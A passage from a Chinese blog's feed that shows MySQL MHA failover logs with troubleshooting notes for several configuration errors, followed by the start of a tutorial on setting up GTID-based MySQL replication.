log-bin:enabledSat May  7 03:08:14 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)Sat May  7 03:08:14 2022 - [info]     Primary candidate for the new Master (candidate_master is set)Sat May  7 03:08:14 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabledSat May  7 03:08:14 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 192.168.73.21(192.168.73.21:3306)? (YES/no): yesSat May  7 03:08:17 2022 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..Sat May  7 03:08:17 2022 - [info]  ok.Sat May  7 03:08:17 2022 - [info] Checking MHA is not monitoring or doing failover..Sat May  7 03:08:17 2022 - [info] Checking replication health on 192.168.73.22..Sat May  7 03:08:17 2022 - [info]  ok.Sat May  7 03:08:17 2022 - [info] Checking replication health on 192.168.73.23..Sat May  7 03:08:17 2022 - [info]  ok.Sat May  7 03:08:17 2022 - [info] 192.168.73.21 can be new master.Sat May  7 03:08:17 2022 - [info]From:192.168.73.21 (current master) +--192.168.73.22 +--192.168.73.23To:192.168.73.21 (new master) +--192.168.73.22 +--192.168.73.23 +--192.168.73.21Starting master switch from 192.168.73.21(192.168.73.21:3306) to 192.168.73.21(192.168.73.21:3306)? (yes/NO): yesSat May  7 03:08:19 2022 - [info] Checking whether 192.168.73.21(192.168.73.21:3306) is ok for the new master..Sat May  7 03:08:19 2022 - [info]  ok.Sat May  7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.Sat May  7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): Resetting slave pointing to the dummy host.Sat May  7 03:08:19 2022 - [info] ** Phase 1: Configuration Check Phase completed.Sat May  7 03:08:19 2022 - [info]Sat May  7 03:08:19 2022 - [info] * Phase 2: Rejecting updates Phase..Sat May  7 03:08:19 2022 - [info]Sat May  7 03:08:19 2022 - [info] Executing master ip online change script to disable write on the current master:Sat May  7 03:08:19 2022 - [info]   /usr/local/bin/master_ip_online_change --command=stop --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306 --orig_master_user=&apos;root&apos; --orig_master_password=&apos;ccc.456&apos; --new_master_host=192.168.73.21 --new_master_ip=192.168.73.21 --new_master_port=3306 --new_master_user=&apos;root&apos; --new_master_password=&apos;ccc.456&apos;***************************************************************Disabling the VIP - 192.168.73.73/24 on old master: 192.168.73.21***************************************************************Got Error: Use of uninitialized value $orig_master_ssh_user in concatenation (.) or string at /usr/local/bin/master_ip_online_change line 101.Sat May  7 03:08:19 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln178] Got ERROR:  at /usr/bin/masterha_master_switch line 53.[root@ctos7mini ~]&amp; </code></pre><h2 id="masterha&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#masterha&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="masterha&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>masterha&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><p><strong>&#x6545;&#x969C;&#x4E00;&#xFF1A;</strong></p><pre><code class="xml">Fri May  6 22:43:11 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May  6 22:43:11 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May  6 22:43:11 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May  6 22:43:11 2022 - [info] MHA::MasterMonitor version 0.54.Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.22(192.168.73.22:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.23(192.168.73.23:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.21(192.168.73.21:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln263] Got fatal error, stopping operationsFri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Fri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May  6 22:43:12 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK!</code></pre><blockquote><p>mha&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x6216;&#x6CA1;&#x5F00;&#x542F;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;</p></blockquote><p><strong>&#x6545;&#x969C;&#x4E8C;&#xFF1A;</strong></p><pre><code class="xml">Fri May  6 22:47:47 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May  6 22:47:47 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May  6 22:47:47 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May  6 22:47:47 2022 - [info] MHA::MasterMonitor version 0.54.Fri May  6 22:47:48 2022 - [info] Dead Servers:Fri May  6 22:47:48 2022 - [info] Alive Servers:Fri May  6 22:47:48 2022 - [info]   192.168.73.21(192.168.73.21:3306)Fri May  6 22:47:48 2022 - [info]   192.168.73.22(192.168.73.22:3306)Fri May  6 22:47:48 2022 - [info]   192.168.73.23(192.168.73.23:3306)Fri May  6 22:47:48 2022 - [info] Alive Slaves:Fri May  6 22:47:48 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May  6 22:47:48 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)Fri May  6 22:47:48 2022 - [info]     Primary candidate for the new Master (candidate_master is set)Fri May  6 22:47:48 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May  6 22:47:48 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)Fri May  6 22:47:48 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Fri May  6 22:47:48 2022 - [info] Checking slave configurations..Fri May  6 22:47:48 2022 - [info] Checking replication filtering settings..Fri May  6 22:47:48 2022 - [info]  binlog_do_db= ha, binlog_ignore_db= mysqlFri May  6 22:47:48 2022 - [info]  Replication filtering check ok.Fri May  6 22:47:48 2022 - [info] Starting SSH connection tests..Fri May  6 22:47:52 2022 - [info] All SSH connection tests passed successfully.Fri May  6 22:47:52 2022 - [info] Checking MHA Node version..Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln122] Got error when getting node version. Error:Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln123]bash: apply_diff_relay_logs: command not foundFri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln151] node version on 192.168.73.22 not found! Maybe MHA Node package is not installed? at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346.Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. node version on 192.168.73.22 not found! Maybe MHA Node package is not installed? at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346.        ...propagated at /usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm line 152.Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May  6 22:47:52 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK!</code></pre><blockquote><p>MySQL&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5B89;&#x88C5;mha node&#x5DE5;&#x5177;</p></blockquote><p><strong>&#x6545;&#x969C;&#x4E09;&#xFF1A;</strong></p><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205061455441.png" alt=""></p><blockquote><p>&#x5BFC;&#x81F4;&#x8BE5;&#x6545;&#x969C;&#x7684;&#x539F;&#x56E0;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x662F;&#x4F9D;&#x8D56;&#x5305;&#x5173;&#x7CFB;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#xFF0C;&#x5177;&#x4F53;&#x9700;&#x8981;&#x6839;&#x636E;&#x5B9E;&#x65F6;&#x73AF;&#x5883;&#x5206;&#x6790;&#x89E3;&#x51B3;</p></blockquote><ul><li>&#x53C2;&#x8003;&#x601D;&#x8DEF;&#xFF1A;<br>&#x786E;&#x4FDD;MySQL&#x7684;<code>libs</code>&#x548C;<code>libs-compat</code>&#x5305;&#x5B89;&#x88C5;&#x4E86;&#xFF0C;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;MySQL&#x9700;&#x8981;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;<pre><code>[root@ctos7mini ~]&amp; rpm -qa |grep mysql-communitymysql-community-common-5.7.24-1.el7.x86_64mysql-community-libs-compat-5.7.32-1.el7.x86_64mysql-community-libs-5.7.24-1.el7.x86_64mysql-community-server-5.7.24-1.el7.x86_64mysql-community-client-5.7.24-1.el7.x86_64</code></pre></li></ul><p><strong>&#x6545;&#x969C;&#x56DB;&#xFF1A;</strong></p><pre><code class="mbox">Sat May  7 00:13:00 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May  7 00:13:00 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May  7 00:13:00 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May  7 00:13:00 2022 - [info] MHA::MasterMonitor version 0.54.Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln622] Master 192.168.73.21:3306 from which slave 192.168.73.23(192.168.73.23:3306) replicates is not defined in the configuration file!Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Sat May  7 00:13:01 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK!</code></pre><pre><code class="mbox">Sat May  7 00:35:16 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May  7 00:35:16 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May  7 00:35:16 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May  7 00:35:16 2022 - [info] MHA::MasterMonitor version 0.54.Sat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln193] There is no alive slave. We can&apos;t do failoverSat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Sat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Sat May  7 00:35:17 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK!</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL&amp;#x9AD8;&amp;#x53EF;&amp;#x7528;&amp;#x96C6;&amp;#x7FA4;&amp;#x2014;&amp;#x2014;MHA&amp;#x67B6;&amp;#x6784;&quot;&gt;&lt;a href=&quot;#MySQL&amp;#x9AD8;&amp;#x53EF;&amp;#x7528;&amp;#x96C6;&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL的GTID主从同步</title>
    <link href="https://marnm.github.io//posts/d77fafec/"/>
    <id>https://marnm.github.io//posts/d77fafec/</id>
    <published>2022-06-07T04:45:07.000Z</published>
    <updated>2022-06-07T05:12:36.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL-GTID-&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#MySQL-GTID-&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="MySQL GTID &#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>MySQL GTID &#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p><strong>&#x6982;&#x5FF5;</strong></p><p>&#x4ECE; MySQL 5.6.5 &#x5F00;&#x59CB;&#x65B0;&#x589E;&#x4E86;&#x4E00;&#x79CD;&#x57FA;&#x4E8E; GTID &#x7684;&#x590D;&#x5236;&#x65B9;&#x5F0F;&#x3002;&#x901A;&#x8FC7; GTID&#x4FDD;&#x8BC1;&#x4E86;&#x6BCF;&#x4E2A;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;ID&#x3002;<br>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5F3A;&#x5316;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x5907;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x6545;&#x969C;&#x6062;&#x590D;&#x4EE5;&#x53CA;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#x3002;<br>&#x5728;&#x539F;&#x6765;&#x57FA;&#x4E8E;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x7684;&#x590D;&#x5236;&#xFF0C;&#x4ECE;&#x5E93;&#x9700;&#x8981;&#x544A;&#x77E5;&#x4E3B;&#x5E93;&#x8981;&#x4ECE;&#x54EA;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x540C;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x9057;&#x6F0F;&#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;<br>&#x501F;&#x52A9;GTID&#xFF0C;&#x5728;&#x53D1;&#x751F;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MySQL&#x7684;&#x5176;&#x5B83;&#x4ECE;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5728;&#x65B0;&#x4E3B;&#x5E93;&#x4E0A;&#x627E;&#x5230;&#x6B63;&#x786E;&#x7684;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x5927;&#x5927;&#x7B80;&#x5316;&#x4E86;&#x590D;&#x6742;&#x590D;&#x5236;&#x62D3;&#x6251;&#x4E0B;&#x96C6;&#x7FA4;&#x7684;&#x7EF4;&#x62A4;&#xFF0C;<br>&#x4E5F;&#x51CF;&#x5C11;&#x4E86;&#x4EBA;&#x4E3A;&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x8BEF;&#x64CD;&#x4F5C;&#x7684;&#x98CE;&#x9669;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x57FA;&#x4E8E;GTID&#x7684;&#x590D;&#x5236;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x98CE;&#x9669;&#x3002;</p><h2 id="&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;"><a href="#&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;"></a>&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;</h2><p>GTID (Global Transaction ID) &#x662F;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5DF2;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x552F;&#x4E00;&#x7684;&#x7F16;&#x53F7;&#x3002; GTID &#x5B9E;&#x9645;&#x4E0A; &#x662F;&#x7531;UUID+TID &#x7EC4;&#x6210;&#x7684;&#x3002;<br>&#x5176;&#x4E2D; UUID &#x662F;&#x4E00;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x3002;TID&#x4EE3;&#x8868;&#x4E86;&#x8BE5;&#x5B9E;&#x4F8B;&#x4E0A;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x6570;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x968F;&#x7740;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5355;&#x8C03;&#x9012;&#x589E;&#x3002;</p><p>&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;GTID&#x7684;&#x5177;&#x4F53;&#x5F62;&#x5F0F;&#xFF1A;03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25&#xFF0C;&#x5192;&#x53F7;&#x5206;&#x5272;&#x524D;&#x8FB9;&#x4E3A;UUID&#xFF0C;&#x540E;&#x8FB9;&#x4E3A;TID&#x3002;  </p><p>GTID &#x96C6;&#x5408;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6765;&#x81EA;&#x591A;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x5B83;&#x4EEC;&#x4E4B;&#x95F4;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002;  </p><p>&#x5982;&#x679C;&#x6765;&#x81EA;&#x540C;&#x4E00;MySQL&#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#x5E8F;&#x53F7;&#x6709;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x533A;&#x95F4;&#xFF0C;&#x5404;&#x7EC4;&#x8303;&#x56F4;&#x4E4B;&#x95F4;&#x7528;&#x5192;&#x53F7;&#x5206;&#x9694;&#x3002;<br>&#x4F8B;&#x5982;&#xFF1A; 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6,03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25<br>    &#x53EF;&#x4EE5;&#x4F7F;&#x7528;show master status&#x5B9E;&#x65F6;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x6570;&#x3002;  </p><h2 id="GTID&#x7684;&#x4F5C;&#x7528;"><a href="#GTID&#x7684;&#x4F5C;&#x7528;" class="headerlink" title="GTID&#x7684;&#x4F5C;&#x7528;"></a>GTID&#x7684;&#x4F5C;&#x7528;</h2><p>GTID&#x91C7;&#x7528;&#x4E86;&#x65B0;&#x7684;&#x590D;&#x5236;&#x534F;&#x8BAE;&#xFF0C;&#x65E7;&#x534F;&#x8BAE;&#x662F;&#xFF0C;&#x9996;&#x5148;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5728;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x504F;&#x79FB;&#x91CF;&#x4F4D;&#x7F6E;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x518D;&#x4ECE;&#x7ED9;&#x5B9A;&#x7684;&#x8FDE;&#x63A5;&#x70B9;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x4EF6;&#x3002;<br>&#x65B0;&#x534F;&#x8BAE;&#x6709;&#x6240;&#x4E0D;&#x540C;&#xFF0C;&#x652F;&#x6301;&#x4EE5;&#x5168;&#x5C40;&#x7EDF;&#x4E00;&#x4E8B;&#x52A1;ID (GTID)&#x4E3A;&#x57FA;&#x7840;&#x7684;&#x590D;&#x5236;&#x3002;&#x5F53;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x6216;&#x8005;&#x88AB;&#x4ECE;&#x5E93;&#x5E94;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9A;&#x4F4D;&#x548C;&#x8FFD;&#x8E2A;&#x6BCF;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x3002;<br>GTID&#x590D;&#x5236;&#x662F;&#x5168;&#x90E8;&#x4EE5;&#x4E8B;&#x52A1;&#x4E3A;&#x57FA;&#x7840;&#xFF0C;&#x4F7F;&#x5F97;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x4E00;&#x81F4;&#x6027;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x5982;&#x679C;&#x6240;&#x6709;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x4E5F;&#x540C;&#x6837;&#x63D0;&#x4EA4;&#x5230;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002;  </p><h2 id="GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h2><p>&#x2460; &#x5F53;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5728;&#x4E3B;&#x5E93;&#x7AEF;&#x6267;&#x884C;&#x5E76;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x4EA7;&#x751F;GTID&#xFF0C;&#x4E00;&#x540C;&#x8BB0;&#x5F55;&#x5230;binlog&#x65E5;&#x5FD7;&#x4E2D;&#x3002;<br>&#x2461; binlog&#x4F20;&#x8F93;&#x5230;slave,&#x5E76;&#x5B58;&#x50A8;&#x5230;slave&#x7684;relaylog&#x540E;&#xFF0C;&#x8BFB;&#x53D6;&#x8FD9;&#x4E2A;GTID&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x7F6E;GTID_next&#x53D8;&#x91CF;&#xFF0C;&#x5373;&#x544A;&#x8BC9;Slave&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x8981;&#x6267;&#x884C;&#x7684;GTID&#x503C;&#x3002;<br>&#x2462; sql&#x7EBF;&#x7A0B;&#x4ECE;relay log&#x4E2D;&#x83B7;&#x53D6;GTID&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x6BD4;slave&#x7AEF;&#x7684;binlog&#x662F;&#x5426;&#x6709;&#x8BE5;GTID&#x3002;<br>&#x2463; &#x5982;&#x679C;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;&#x8BF4;&#x660E;&#x8BE5;GTID&#x7684;&#x4E8B;&#x52A1;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#xFF0C;slave&#x4F1A;&#x5FFD;&#x7565;&#x3002;<br>&#x2464; &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;slave&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x8BE5;GTID&#x4E8B;&#x52A1;&#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5;GTID&#x5230;&#x81EA;&#x8EAB;&#x7684;binlog&#xFF0C;&#x5728;&#x8BFB;&#x53D6;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x524D;&#x4F1A;&#x5148;&#x68C0;&#x67E5;&#x5176;&#x4ED6;session&#x6301;&#x6709;&#x8BE5;GTID&#xFF0C;&#x786E;&#x4FDD;&#x4E0D;&#x88AB;&#x91CD;&#x590D;&#x6267;&#x884C;&#x3002;<br>&#x2465; &#x5728;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;&#x4E3B;&#x952E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x5168;&#x90E8;&#x626B;&#x63CF;&#x3002;  </p><h2 id="GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;"><a href="#GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;"></a>GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;</h2><ul><li>&#x66F4;&#x7B80;&#x5355;&#x7684;&#x5B9E;&#x73B0;failover&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x627E;log_file&#x548C;log_Pos  </li><li>&#x66F4;&#x7B80;&#x5355;&#x7684;&#x642D;&#x5EFA;&#x4E3B;&#x4ECE;&#x590D;&#x5236;</li><li>&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x66F4;&#x52A0;&#x5B89;&#x5168;</li><li>GTID&#x662F;&#x8FDE;&#x7EED;&#x6CA1;&#x6709;&#x7A7A;&#x6D1E;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x4E3B;&#x4ECE;&#x5E93;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x51B2;&#x7A81;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6DFB;&#x52A0;&#x7A7A;&#x4E8B;&#x7269;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8DF3;&#x8FC7;</li></ul><h2 id="&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID"><a href="#&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID" class="headerlink" title="&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID"></a>&#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID</h2><pre><code>&#x6570;&#x636E;&#x5E93;&#x89D2;&#x8272;           IP         &#x7CFB;&#x7EDF;&#x4E0E;MySQL&#x7248;&#x672C;         &#x6709;&#x65E0;&#x6570;&#x636E;&#x4E3B;&#x6570;&#x636E;&#x5E93;        192.168.10.11    RHEL7 MySQL5.7        &#x65E0;&#x6570;&#x636E;&#x4ECE;&#x6570;&#x636E;&#x5E93;        192.168.10.12    RHEL7 MySQL5.7        &#x65E0;&#x6570;&#x636E;</code></pre><p>&#x5728;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8D26;&#x6237;&#x6388;&#x6743;&#x7ED9;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;</p><pre><code class="xml">[root@server11 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  